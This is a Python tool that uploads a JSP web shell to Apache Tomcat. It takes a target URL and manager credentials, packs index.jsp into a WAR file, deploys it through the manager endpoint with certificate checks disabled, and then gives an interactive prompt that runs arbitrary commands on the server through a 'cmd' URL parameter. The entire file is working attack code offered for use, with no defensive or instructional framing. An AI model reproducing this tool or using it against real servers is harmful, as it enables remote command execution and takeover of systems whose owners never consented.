import requests
import os
import time
import argparse
import re

class Tomcat_War():
    def __init__(self,target,username,password,version):
        self.target = target
        self.username = username
        self.password = password
        self.version = version

        self.url = self.check_url()
        self.path = self.version_check()
        self.build_payload()

    def check_url(self):
        check = self.target[-1]
        if check == "/": 
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def version_check(self):
        if self.version >= '7':
            path = '/manager/text/'
            return path
        else:
            path = '/manager/'
            return path

    def build_payload(self):
        print("Building WAR file")
        time.sleep(1) 
        os.system("jar -cvf webshell.war index.jsp")
        
        self.send_payload()

    def send_payload(self):
        requests.packages.urllib3.disable_warnings()
        print("Uploading WAR payload!")

        data = open('webshell.war','rb').read()

        header = {"Content-Type": "application/octet-stream"} 
        
        undeploy_url_path = self.url + self.path + "undeploy?path=/webshell"
        req_site = requests.put(undeploy_url_path,headers=header,data=data, auth=(self.username,self.password), verify=False)

        deploy_url_path = self.url + self.path + "deploy?path=/webshell" 
        req_site = requests.put(deploy_url_path,headers=header,data=data, auth=(self.username,self.password), verify=False)

        if req_site.status_code == 200:
            print("Payload uploaded!")
            time.sleep(1)
            self.shell()
        else:
            print("Unable to upload file!")
            time.sleep(1)
            exit()

    def shell(self):
        full_url = self.url + "webshell/index.jsp?cmd="
        while True:
            try:
                requests.packages.urllib3.disable_warnings()
                cmd = input("Shell: ")
                shell_url = full_url + cmd
                
                print(shell_url)
                req_site = requests.get(shell_url,verify=False)
                cmd_output = re.findall("<pre>(.*)</pre>",req_site.text)
                print(cmd_output[0].replace("</br>","\n"))

            except KeyboardInterrupt:
                print("Bye Bye!")
                exit()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Tomcat WAR File Upload')

    parser.add_argument('-t', metavar="<Target's URL>", help='target/host IP, E.G: http://tomcatsite.blah/', required=True)
    parser.add_argument('-u', metavar='<username>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help='Password', required=True)
    parser.add_argument('--version', metavar='<version>', help='The tomcat version E.G --version 8', required=True)
    args = parser.parse_args()

    print("Welcome to WAR tomcat file uploader!")
    time.sleep(1)  

    Tomcat_War(args.t,args.u,args.p,args.version)

